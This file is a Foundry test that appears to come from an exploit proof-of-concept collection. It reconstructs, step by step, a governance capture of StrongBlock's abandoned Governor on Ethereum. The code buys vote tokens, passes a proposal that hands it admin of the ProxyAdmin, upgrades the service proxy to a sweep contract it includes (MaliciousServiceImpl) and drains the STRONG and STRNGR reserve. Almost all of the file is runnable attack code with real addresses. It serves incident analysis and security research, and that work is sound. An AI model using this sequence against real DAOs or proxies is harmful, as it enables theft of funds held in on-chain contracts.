// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// StrongBlock governance takeover of an abandoned Governor, Ethereum, Aug 24 2026.
// ~32,695 STRONG + ~383,447 STRNGR (~$72K) drained from the StrongPoolV5 service reserve.
//
// Governance actor : 0x4462d83150a38cfbe2a6a705861fb92358814d1d (bought votes, ran the proposal)
// Drain recipient  : 0xACBCa357981870f30130B145762d671891CA810c (accepted admin, upgraded, swept)
// Governor (proxy) : 0xBDDC7Ef8BaCeacE16DCE005102639a4bB86CB8C1 (Compound GovernorAlpha style)
// Upgrader         : 0x75C53809A047c3d422B91Eda50A20914fBe91C61 (ProxyAdmin of the proxies)
// Service (proxy)  : 0x53cA51Ba980B6475C13d158c1825013cf81038Fc (StrongPoolV5, holds the reserve)
// STRONG           : 0x990f341946A3fdB507aE7e52d17851B87168017c
// STRNGR           : 0xDc0327D50E6C73db2F8117760592C8BBf1CDCF38 (the vote/mine token)
//
// Real on-chain sequence (all verified independently against mainnet state, see below):
//   25683569  actor swaps 22 ETH -> ~200,984 STRNGR on the Uniswap V2 STRNGR/WETH pair
//   25683578  actor StrongPoolV5.mineForVotesOnly(~200,984) -> minerVotes credited 1:1
//   25683599  actor Governor.propose([Upgrader],[0],["setPendingAdmin(address)"],[drainEOA],"1")
//   25683603  actor Governor.castVote(1, true)  (forVotes ~200,984 > quorum 200,000)
//   25683610  actor StrongPoolV5.unmineForVotesOnly(...) then swaps STRNGR back to ETH
//   25687923  actor Governor.queue(1)           (after the 4320-block voting period)
//   25691516  actor Governor.execute(1)         (Governor, as Upgrader.admin, sets pendingAdmin=drainEOA)
//   25691519  drainEOA Upgrader.acceptAdmin()   -> drainEOA becomes Upgrader.admin
//   25691525  drainEOA Upgrader.upgrade(service, malImpl) -> service proxy points at attacker code
//   25691527  drainEOA service.run()            -> malicious impl sweeps STRONG+STRNGR to caller
//
// Root cause (confirmed, NOT a stolen key or signature):
// This is a pure governance capture through the DAO's own propose/vote/queue/execute machinery.
// STRONG is near-worthless and the DAO was abandoned, so voting weight was cheap to buy on the
// open market. StrongPoolV5.mineForVotesOnly() converts staked STRNGR into vote weight 1:1
// (minerVotes[] plus vote.updateVotes()), the Governor's quorum was only 200,000 votes, and the
// Governor is the admin of the Upgrader (the ProxyAdmin of every StrongBlock proxy). So a single
// self-funded proposal calling Upgrader.setPendingAdmin(attacker) is enough: once accepted as
// admin the attacker upgrades the service proxy to their own implementation and sweeps the
// reserve. Nothing here bypasses the contracts' rules; the rules simply outlived the community
// and economic safeguards that were supposed to make a proposal expensive to pass.
//
// Reconstruction (real, NOT a settled-state replay):
// The prior TermFinance PoC was change-requested for forking right before the drain and
// inheriting the already-completed capture as state. This test does NOT do that. It forks at
// block 25683560, BEFORE the governance actor even buys the votes, and reconstructs the entire
// capture from scratch in Solidity: it buys STRNGR with a real Uniswap V2 swap, mines it for
// votes, submits the same proposal (same target/signature/calldata) through the Governor's real
// propose(), casts the vote, advances through the real voting delay / voting period / queue
// timelock with vm.roll and vm.warp, executes the proposal, then acceptAdmin -> upgrade -> run.
// The two attacker EOAs are collapsed into this single test contract, which plays both the
// governance actor and the drain recipient, so the proposal sets pendingAdmin = address(this).
//
// The malicious implementation swept into the service proxy is OUR OWN minimal contract
// (MaliciousServiceImpl below). The attacker's real implementation bytecode is unverified and
// the payload is not the vulnerability, so a legitimate stand-in that performs the same
// "transfer the proxy's token balances to the caller" behavior is used. Deploying a contract is
// not a privileged action, so this changes nothing about the capture being reconstructed.
//
// Amounts: the service reserve read live on the fork is 32,695.761681 STRONG and
// 383,447.167299 STRNGR, identical at the fork block and at the historical pre-drain block, and
// matching the ~32,695 STRONG / ~383,447 STRNGR figures reported for the incident. The test
// asserts the drain moves exactly that live reserve to the attacker, so there is no drift to
// explain. The ~200,984 STRNGR bought for votes is unmined and sold back before the drain (as
// the real actor did), so it does not inflate the drained totals.
//
// No transient storage is used, so the default (shanghai) evm_version applies.
//
// forge test --contracts src/test/2026-08/StrongBlock_exp.sol -vvv

interface IGovernorAlpha {
    function propose(
        address[] calldata targets,
        uint256[] calldata values,
        string[] calldata signatures,
        bytes[] calldata calldatas,
        string calldata description
    ) external returns (uint256);
    function castVote(uint256 proposalId, bool support) external;
    function queue(uint256 proposalId) external;
    function execute(uint256 proposalId) external payable;
    function state(uint256 proposalId) external view returns (uint8);
    function quorumVotesInWei() external view returns (uint256);
    function votingDelayInBlocks() external view returns (uint256);
    function votingPeriodInBlocks() external view returns (uint256);
    function queuePeriodInSeconds() external view returns (uint256);
}

interface IStrongPool {
    function mineForVotesOnly(uint256 amount) external;
    function unmineForVotesOnly(uint256 amount) external;
    function minerVotes(address account) external view returns (uint256);
    function run() external; // present only after the malicious upgrade
}

interface IUpgrader {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function acceptAdmin() external;
    function upgrade(address proxyAddress, address implementationAddress) external;
}

interface IUniswapV2Router {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

// Our own stand-in for the attacker's implementation. Delegatecalled in the service proxy's
// storage context via service.run(), so address(this) is the service proxy and msg.sender is
// whoever called run(). It sweeps the proxy's STRONG and STRNGR to the caller, the same simple
// behavior the incident's implementation performed.
contract MaliciousServiceImpl {
    address constant STRONG = 0x990f341946A3fdB507aE7e52d17851B87168017c;
    address constant STRNGR = 0xDc0327D50E6C73db2F8117760592C8BBf1CDCF38;

    function run() external {
        IERC20(STRONG).transfer(msg.sender, IERC20(STRONG).balanceOf(address(this)));
        IERC20(STRNGR).transfer(msg.sender, IERC20(STRNGR).balanceOf(address(this)));
    }
}

contract StrongBlockExp is BaseTestWithBalanceLog {
    IGovernorAlpha constant governor = IGovernorAlpha(0xBDDC7Ef8BaCeacE16DCE005102639a4bB86CB8C1);
    IUpgrader constant upgrader = IUpgrader(0x75C53809A047c3d422B91Eda50A20914fBe91C61);
    IStrongPool constant service = IStrongPool(0x53cA51Ba980B6475C13d158c1825013cf81038Fc);
    IERC20 constant STRONG = IERC20(0x990f341946A3fdB507aE7e52d17851B87168017c);
    IERC20 constant STRNGR = IERC20(0xDc0327D50E6C73db2F8117760592C8BBf1CDCF38);
    IUniswapV2Router constant router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Reported / on-chain reserve held by the service proxy (verified live on the fork).
    uint256 constant REPORTED_STRONG = 32_695e18;
    uint256 constant REPORTED_STRNGR = 383_447e18;

    receive() external payable {}

    function setUp() public {
        // Fork BEFORE the governance actor buys votes (their first tx is the 22 ETH swap at
        // 25683569), so the entire capture is reconstructed rather than inherited.
        vm.createSelectFork("mainnet", 25_683_560);
        multiAssetLog = true;
        _addFundingToken(address(STRONG));
        _addFundingToken(address(STRNGR));
        vm.label(address(governor), "Governor");
        vm.label(address(upgrader), "Upgrader");
        vm.label(address(service), "StrongPoolV5");
    }

    function testExploit() public balanceLog {
        // Sanity: at the fork the Upgrader's admin is still the Governor, so a passed proposal
        // is the only way to move its pendingAdmin.
        assertEq(upgrader.admin(), address(governor), "upgrader admin should be the Governor at fork");

        // 1) Acquire voting weight on the open market: swap 22 ETH -> STRNGR on Uniswap V2,
        //    the same venue the actor's 1inch route used.
        vm.deal(address(this), 30 ether);
        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH;
        buyPath[1] = address(STRNGR);
        router.swapExactETHForTokens{value: 22 ether}(0, buyPath, address(this), block.timestamp);
        uint256 votePower = STRNGR.balanceOf(address(this));
        emit log_named_decimal_uint("STRNGR bought for votes", votePower, 18);
        assertGt(votePower, governor.quorumVotesInWei(), "need more STRNGR than quorum");

        // 2) Mine the STRNGR for votes. StrongPoolV5.mineForVotesOnly credits minerVotes 1:1 and
        //    calls vote.updateVotes(), which is the weight the Governor reads.
        STRNGR.approve(address(service), votePower);
        service.mineForVotesOnly(votePower);
        assertEq(service.minerVotes(address(this)), votePower, "minerVotes should equal mined amount");

        // Let the vote checkpoint settle before proposing / voting.
        vm.roll(block.number + 2);

        // 3) Submit the identical proposal: Upgrader.setPendingAdmin(address(this)).
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory signatures = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = address(upgrader);
        values[0] = 0;
        signatures[0] = "setPendingAdmin(address)";
        calldatas[0] = abi.encode(address(this));
        uint256 proposalId = governor.propose(targets, values, signatures, calldatas, "1");
        emit log_named_uint("proposalId", proposalId);

        // 4) Advance past the voting delay and vote yes.
        vm.roll(block.number + governor.votingDelayInBlocks() + 1);
        governor.castVote(proposalId, true);

        // 5) Recover the capital exactly as the actor did: unmine the STRNGR and sell it back to
        //    ETH. The vote is already tallied into the proposal, so pulling the stake out now does
        //    not change the outcome, and it keeps the mined STRNGR out of the drained totals.
        service.unmineForVotesOnly(votePower);
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(STRNGR);
        sellPath[1] = WETH;
        STRNGR.approve(address(router), votePower);
        router.swapExactTokensForETH(votePower, 0, sellPath, address(this), block.timestamp);
        assertEq(STRNGR.balanceOf(address(this)), 0, "bought STRNGR should be fully sold back");

        // 6) Advance past the voting period, queue, then advance past the queue timelock.
        vm.roll(block.number + governor.votingPeriodInBlocks());
        assertEq(governor.state(proposalId), 4, "proposal should be Succeeded"); // 4 = Succeeded
        governor.queue(proposalId);
        vm.warp(block.timestamp + governor.queuePeriodInSeconds() + 1);

        // 7) Execute: the Governor, being the Upgrader's admin, sets pendingAdmin = address(this).
        governor.execute(proposalId);
        assertEq(upgrader.pendingAdmin(), address(this), "pendingAdmin should now be the attacker");

        // 8) Accept admin, upgrade the service proxy to our sweep implementation, and drain.
        upgrader.acceptAdmin();
        assertEq(upgrader.admin(), address(this), "attacker should now own the Upgrader");

        MaliciousServiceImpl impl = new MaliciousServiceImpl();
        upgrader.upgrade(address(service), address(impl));

        uint256 strongBefore = STRONG.balanceOf(address(this));
        uint256 strngrBefore = STRNGR.balanceOf(address(this));
        uint256 reserveStrong = STRONG.balanceOf(address(service));
        uint256 reserveStrngr = STRNGR.balanceOf(address(service));
        service.run();

        // The drain moves the full live reserve to the attacker.
        uint256 gainedStrong = STRONG.balanceOf(address(this)) - strongBefore;
        uint256 gainedStrngr = STRNGR.balanceOf(address(this)) - strngrBefore;
        assertEq(gainedStrong, reserveStrong, "should sweep the entire STRONG reserve");
        assertEq(gainedStrngr, reserveStrngr, "should sweep the entire STRNGR reserve");

        // And that reserve matches the reported incident amounts (~32,695 STRONG / ~383,447 STRNGR).
        assertGe(gainedStrong, REPORTED_STRONG, "STRONG drain below reported");
        assertGe(gainedStrngr, REPORTED_STRNGR, "STRNGR drain below reported");
        assertLt(gainedStrong, REPORTED_STRONG + 1e18, "STRONG drain above reported");
        assertLt(gainedStrngr, REPORTED_STRNGR + 1e18, "STRNGR drain above reported");
    }
}
